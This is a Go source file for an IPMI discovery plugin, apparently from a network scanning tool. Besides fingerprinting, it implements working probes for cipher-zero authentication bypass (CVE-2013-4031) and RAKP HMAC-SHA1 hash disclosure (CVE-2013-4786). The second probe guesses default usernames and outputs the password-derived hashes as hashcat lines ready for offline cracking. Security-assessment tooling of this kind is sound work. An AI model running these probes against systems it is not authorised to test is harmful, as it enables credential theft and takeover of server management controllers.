// Package plugins provides IPMI (Intelligent Platform Management Interface) service fingerprinting.
//
// The IPMI fingerprinter runs three pre-auth probes against UDP/623:
//
//  1. Get-Channel-Authentication-Capabilities — the always-run reach
//     test. We use the parsed Auth-Type-Support-1/2/3 bitmaps to fill
//     IpmiAuthCapabilities and to detect IPMI 2.0 support correctly
//     (the old plugin read the wrong byte and always reported "1.5").
//
//  2. Cipher Zero Open Session (CVE-2013-4031). A BMC that returns
//     status 0x00 to an RMCP+ Open Session Request with cipher suite 0
//     (no auth / no integrity / no confidentiality) is critically
//     misconfigured — any subsequent IPMI commands will run as the
//     named user without authentication.
//
//  3. RAKP HMAC-SHA1 disclosure (CVE-2013-4786). For each guessed
//     username in DefaultUsernameGuesses we complete an Open Session
//     + RAKP-1/RAKP-2 round-trip. RAKP-2 carries an HMAC-SHA1 keyed
//     with the user's password material — offline-crackable as
//     hashcat -m 7300. A non-zero status from RAKP-2 indicates the
//     username does not exist on the BMC; the deep probe records
//     which guesses returned a hash so the operator gets both the
//     existence oracle and the crackable blob in one signal.
package plugins

import (
	"context"
	"encoding/hex"
	"fmt"
	"net"

	"github.com/Method-Security/networkscan/generated/go/common"
	"github.com/Method-Security/networkscan/generated/go/common/protocol"
	discoverfern "github.com/Method-Security/networkscan/generated/go/discover"
	"github.com/Method-Security/networkscan/internal/discover/service/helpers"
	ipmiprotocol "github.com/Method-Security/networkscan/internal/protocol/ipmi"
	"github.com/Method-Security/networkscan/utils"
)

// IPMIFingerprinter is the UDP/623 IPMI discovery plugin. See package
// docs for the three probes it runs.
type IPMIFingerprinter struct{}

// Name returns the fingerprinter identifier.
func (IPMIFingerprinter) Name() string { return "ipmi" }

// DefaultPorts returns the UDP ports the IPMI fingerprinter watches.
func (IPMIFingerprinter) DefaultPorts() []int { return []int{623} }

// Detect runs the three-probe IPMI pipeline against the host and
// returns a populated discoverfern.ServiceDetails. Returns an error
// only when the first probe (Get-Channel-Auth-Caps) fails — Probe B
// (cipher zero) and Probe C (RAKP) are best-effort: their failures
// surface as omitted fields, not as a discovery failure, so a BMC
// that times out on the deep probes still shows up as IPMI.
func (IPMIFingerprinter) Detect(ctx context.Context, ip net.IP, port int, host string, timeout int) (*discoverfern.ServiceDetails, error) {
	// Wall-clock guard for the whole pipeline. helpers.Dial honours
	// context cancellation, so a single outer deadline of `timeout`
	// seconds bounds the cumulative time across all three probes —
	// without this, three sequential calls of `timeout/3` each could
	// still triple-budget when integer division flooring forces us
	// to floor each probe's per-call timeout to 1s (e.g. timeout=1).
	//
	// When timeout <= 0 the caller explicitly asked for no deadline
	// (helpers.ContextDuration short-circuits to context.WithCancel).
	// In that case the per-probe value must propagate "no timeout"
	// too — helpers.HasTimeout treats timeout=0 as "deadline=now"
	// (immediate failure), so we use -1 instead.
	hostCtx, cancel := helpers.ContextDuration(ctx, helpers.Timeout(timeout))
	defer cancel()

	var perProbeTimeout int
	if timeout > 0 {
		// Per-probe UDP timeout. Floor at 1s because helpers.Dial
		// treats timeout==0 as "set deadline = now" — instant failure.
		// The outer hostCtx is what actually prevents three 1s probes
		// from totalling 3s; this value is just the upper bound on a
		// single hung read.
		perProbeTimeout = timeout / 3
		if perProbeTimeout < 1 {
			perProbeTimeout = 1
		}
	} else {
		// No-timeout requested: propagate to per-probe so reads block
		// until data or peer close, matching the host-level intent.
		// hostCtx has no deadline either, so cumulative wall time is
		// unbounded but consistent with the caller's contract.
		perProbeTimeout = -1
	}

	addr := utils.FormatHostPort(ip.String(), port)

	// Probe A: Get-Channel-Authentication-Capabilities (always-run).
	caps, rawCapsResp, err := runAuthCapsProbe(hostCtx, addr, perProbeTimeout)
	if err != nil {
		return nil, err
	}

	version := caps.Version()

	// Backward-compatible authType string: the old plugin stored the
	// first byte of the session header (always 0x00) and downstream
	// consumers may read it. We now store the *real* Auth-Type-Support-1
	// bitmap byte from offset 22, which conveys the channel auth-type
	// mask. Fall back to the old "0x00" when we somehow couldn't pull
	// that byte (truncated response).
	authTypeStr := "0x00"
	if rawByte, ok := ipmiprotocol.CopyAuthTypeSupport1(rawCapsResp); ok {
		authTypeStr = fmt.Sprintf("0x%02x", rawByte)
	}

	authCaps := authCapsToFern(caps)

	metadata := &protocol.IpmiServerInfo{
		Version:          &version,
		AuthType:         &authTypeStr,
		AuthCapabilities: authCaps,
	}

	// Probe B: Cipher Zero Open Session Request (CVE-2013-4031). Only
	// run when the BMC advertised IPMI 2.0 support; running it against
	// a v1.5-only BMC will just time out.
	if caps.IPMI20Supported {
		accepted, ok := runCipherZeroProbe(hostCtx, addr, perProbeTimeout)
		if ok {
			metadata.CipherZeroAccepted = &accepted
		}
	}

	// Probe C: RAKP HMAC-SHA1 disclosure (CVE-2013-4786). Same gate as
	// Probe B — RAKP only exists in IPMI 2.0.
	if caps.IPMI20Supported {
		probed, disclosures := runRAKPExistenceOracle(hostCtx, addr, perProbeTimeout, ipmiprotocol.DefaultUsernameGuesses)
		if len(probed) > 0 {
			metadata.ProbedUsernames = probed
		}
		if len(disclosures) > 0 {
			metadata.RakpHashesDisclosed = disclosures
		}
	}

	return &discoverfern.ServiceDetails{
		Host:      host,
		Ip:        ip.String(),
		Port:      port,
		Tls:       false,
		Transport: common.TransportTypeUdp,
		Protocol:  common.ProtocolTypeIpmi,
		Version:   &version,
		Metadata:  &discoverfern.ServiceMetadata{Ipmi: metadata},
	}, nil
}

// runAuthCapsProbe performs Probe A. It is the gate for the whole
// fingerprinter: failure here means the host is not IPMI.
func runAuthCapsProbe(ctx context.Context, addr string, timeout int) (ipmiprotocol.AuthCapabilities, []byte, error) {
	resp, err := udpExchange(ctx, addr, timeout, ipmiprotocol.BuildGetChannelAuthCapabilitiesRequest())
	if err != nil {
		return ipmiprotocol.AuthCapabilities{}, nil, err
	}
	caps, err := ipmiprotocol.ParseAuthCapabilities(resp)
	if err != nil {
		return ipmiprotocol.AuthCapabilities{}, nil, err
	}
	return caps, resp, nil
}

// runCipherZeroProbe performs Probe B. Returns (accepted, ok) — ok==false
// means we never got a parseable response and the field should be
// omitted from the report.
func runCipherZeroProbe(ctx context.Context, addr string, timeout int) (bool, bool) {
	const messageTag byte = 0x00
	consoleSID, err := ipmiprotocol.GenerateConsoleSessionID()
	if err != nil {
		return false, false
	}
	probe := ipmiprotocol.BuildCipherZeroOpenSessionRequest(messageTag, consoleSID)
	resp, err := udpExchange(ctx, addr, timeout, probe)
	if err != nil {
		return false, false
	}
	openResp, err := ipmiprotocol.ParseOpenSessionResponse(resp)
	if err != nil {
		return false, false
	}
	return openResp.Accepted(), true
}

// runRAKPExistenceOracle performs Probe C. Returns the list of
// usernames we tried and the disclosures for any that succeeded.
//
// probeBudget is the *total* per-probe time budget (in seconds) Probe
// C is allowed to consume — splitting that across `len(usernames)`
// guesses × 2 UDP exchanges (open-session + RAKP-1) bounds the actual
// wall time. Without this division Probe C could blow well past the
// caller's per-host budget (5 guesses × 2 calls × probeBudget ≈ 10×
// the intended ceiling). Per-call timeouts of 0 would mean "no
// timeout" in helpers.Dial, so we clamp to a 1s floor.
func runRAKPExistenceOracle(ctx context.Context, addr string, probeBudget int, usernames []string) ([]string, []*protocol.IpmiRakpHashDisclosure) {
	probed := make([]string, 0, len(usernames))
	disclosures := make([]*protocol.IpmiRakpHashDisclosure, 0, len(usernames))

	// Per-call budget: each username burns up to 2 UDP exchanges.
	// Integer floor; 1s minimum so we never pass 0 (which means
	// "no timeout" to helpers.Dial).
	denom := 2 * len(usernames)
	if denom < 1 {
		denom = 1
	}
	perCallTimeout := probeBudget / denom
	if perCallTimeout < 1 {
		perCallTimeout = 1
	}

	// Also wrap the loop with a context deadline tied to the overall
	// probe budget. If individual calls overrun (BMCs do that), the
	// outer deadline short-circuits the remaining guesses.
	probeCtx, cancel := helpers.ContextDuration(ctx, helpers.Timeout(probeBudget))
	defer cancel()

	for _, username := range usernames {
		// Context cancellation between guesses gives the outer
		// discovery sweep a way out without waiting on the per-probe
		// UDP timeout for every remaining username.
		if err := probeCtx.Err(); err != nil {
			break
		}
		probed = append(probed, username)
		disclosure, ok := runSingleRAKP(probeCtx, addr, perCallTimeout, username)
		if ok {
			disclosures = append(disclosures, disclosure)
		}
	}
	return probed, disclosures
}

// runSingleRAKP performs one Open-Session + RAKP-1/RAKP-2 round-trip
// for a guessed username. Returns (disclosure, true) when the BMC
// returned an HMAC-SHA1 blob (CVE-2013-4786). Returns ok==false for
// any failure: bad open-session response, timed-out RAKP-1, RAKP-2
// status != 0 (username not found), or truncated response.
func runSingleRAKP(ctx context.Context, addr string, timeout int, username string) (*protocol.IpmiRakpHashDisclosure, bool) {
	consoleSID, err := ipmiprotocol.GenerateConsoleSessionID()
	if err != nil {
		return nil, false
	}
	// Open Session with HMAC-SHA1 / HMAC-SHA1-96 / AES-CBC-128 (cipher
	// suite 3). We don't actually use the negotiated cipher — we never
	// run an authenticated command — but the BMC will only return RAKP
	// material when we picked a non-NONE auth algorithm.
	const messageTag byte = 0x01
	openReq := ipmiprotocol.BuildOpenSessionRequest(messageTag, ipmiprotocol.PrivilegeAdministrator, consoleSID,
		ipmiprotocol.AuthAlgorithmRAKPHMACSHA1,
		ipmiprotocol.IntegrityAlgorithmHMACSHA196,
		ipmiprotocol.ConfidentialityAlgorithmAESCBC128)
	openResp, err := udpExchange(ctx, addr, timeout, openReq)
	if err != nil {
		return nil, false
	}
	parsedOpen, err := ipmiprotocol.ParseOpenSessionResponse(openResp)
	if err != nil || !parsedOpen.Accepted() {
		return nil, false
	}

	consoleNonce, err := ipmiprotocol.GenerateConsoleNonce()
	if err != nil {
		return nil, false
	}
	const rakpTag byte = 0x02
	rakp1, err := ipmiprotocol.BuildRAKPMessage1(rakpTag, parsedOpen.BMCSessionID, consoleNonce, username)
	if err != nil {
		return nil, false
	}
	rakp2Raw, err := udpExchange(ctx, addr, timeout, rakp1)
	if err != nil {
		return nil, false
	}
	rakp2, err := ipmiprotocol.ParseRAKPMessage2(rakp2Raw)
	if err != nil || !rakp2.Success() {
		return nil, false
	}

	bmcGUIDHex := hex.EncodeToString(rakp2.BMCGUID[:])
	consoleNonceHex := hex.EncodeToString(consoleNonce[:])
	bmcNonceHex := hex.EncodeToString(rakp2.BMCNonce[:])
	bmcSIDHex := fmt.Sprintf("%08x", parsedOpen.BMCSessionID)
	consoleSIDHex := fmt.Sprintf("%08x", consoleSID)
	// privilegeLevel reports the IPMI privilege we requested for the
	// open session (Administrator == 0x04), NOT the RAKP-1 role byte
	// (which is Administrator OR'd with name-only-lookup, 0x14).
	// Downstream consumers reading IpmiRakpHashDisclosure.privilegeLevel
	// expect the IPMI privilege level, not the RAKP wire byte.
	privilegeLevel := int(ipmiprotocol.PrivilegeAdministrator)
	hmacHex := hex.EncodeToString(rakp2.KeyExchangeAuthCode)

	hashcatLine := ipmiprotocol.FormatHashcatLine(username,
		parsedOpen.BMCSessionID, consoleSID,
		consoleNonce[:], rakp2.BMCNonce[:], rakp2.BMCGUID[:],
		ipmiprotocol.HashcatRoleByte, rakp2.KeyExchangeAuthCode)

	return &protocol.IpmiRakpHashDisclosure{
		Username:         username,
		BmcGuid:          &bmcGUIDHex,
		ConsoleNonce:     &consoleNonceHex,
		BmcNonce:         &bmcNonceHex,
		BmcSessionId:     &bmcSIDHex,
		ConsoleSessionId: &consoleSIDHex,
		PrivilegeLevel:   &privilegeLevel,
		HmacSha1:         hmacHex,
		HashcatLine:      &hashcatLine,
	}, true
}

// udpExchange sends a single UDP datagram to addr and reads one
// response within timeout seconds. We do not share the socket across
// probes — UDP is connectionless and each probe targets a different
// session state, so a fresh socket is cleaner than juggling deadlines.
func udpExchange(ctx context.Context, addr string, timeout int, probe []byte) ([]byte, error) {
	conn, err := helpers.Dial(ctx, "udp", addr, timeout)
	if err != nil {
		return nil, err
	}
	defer func() { _ = conn.Close() }()
	if err := helpers.SetDeadline(conn, timeout); err != nil {
		return nil, err
	}
	if _, err := conn.Write(probe); err != nil {
		return nil, err
	}
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, err
	}
	return buf[:n], nil
}

// authCapsToFern translates the parsed AuthCapabilities struct into
// the Fern model. The Fern schema documents that omitted fields mean
// "the response was too short to parse that byte" — so we leave the
// pointer nil whenever the source bitmap wasn't actually read, rather
// than emitting `false` and lying about partial v1.5-only responses.
//
// Bitmap1Parsed gates None/MD2/MD5/Straight/OEM/IPMI20-extended.
// Bitmap2Parsed gates the user-class / per-msg flags.
// Bitmap3Parsed gates IPMI 1.5 / 2.0 support flags.
// OEMIDParsed gates the OEM ID.
// Channel number is always populated when ParseAuthCapabilities
// succeeds (it's read before the bitmap1 gate).
func authCapsToFern(caps ipmiprotocol.AuthCapabilities) *protocol.IpmiAuthCapabilities {
	out := &protocol.IpmiAuthCapabilities{}
	channel := int(caps.ChannelNumber)
	out.ChannelNumber = &channel

	if caps.Bitmap1Parsed {
		authNone := caps.AuthNone
		authMD2 := caps.AuthMD2
		authMD5 := caps.AuthMD5
		authStraight := caps.AuthStraight
		authOEM := caps.AuthOEM
		ipmi20Ext := caps.IPMI20ExtendedCapabilities
		out.None = &authNone
		out.Md2 = &authMD2
		out.Md5 = &authMD5
		out.StraightPassword = &authStraight
		out.Oem = &authOEM
		out.Ipmi20ExtendedCapabilities = &ipmi20Ext
	}

	if caps.Bitmap2Parsed {
		perMsg := caps.PerMessageAuthDisabled
		userLvl := caps.UserLevelAuthDisabled
		anon := caps.AnonymousLoginEnabled
		nullUser := caps.NullUsernameEnabled
		nonNull := caps.NonNullUsernameEnabled
		kg := caps.KgSet
		out.PerMessageAuthDisabled = &perMsg
		out.UserLevelAuthDisabled = &userLvl
		out.AnonymousLoginEnabled = &anon
		out.NullUsernameEnabled = &nullUser
		out.NonNullUsernameEnabled = &nonNull
		out.KgSet = &kg
	}

	if caps.Bitmap3Parsed {
		ipmi15Supp := caps.IPMI15Supported
		ipmi20Supp := caps.IPMI20Supported
		out.Ipmi15Supported = &ipmi15Supp
		out.Ipmi20Supported = &ipmi20Supp
	}

	if caps.OEMIDParsed {
		oemID := int(caps.OEMID)
		out.OemId = &oemID
	}

	return out
}
